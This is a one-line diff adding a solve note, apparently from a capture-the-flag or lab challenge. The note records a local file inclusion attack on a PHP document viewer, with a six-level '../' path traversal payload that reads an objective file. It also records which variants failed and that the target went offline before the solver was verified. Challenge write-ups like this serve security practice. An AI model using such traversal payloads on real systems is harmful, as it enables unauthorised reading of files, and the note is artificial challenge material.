@@ -1,0 +1,1 @@
+LFI: GET /reader.php?doc=../../../../../../run/huntress/objective.txt (6 levels works; absolute path and ....// don't). Proof printed right after the 'Document viewer' pill. Target 410 after solve, so solver unverified live.
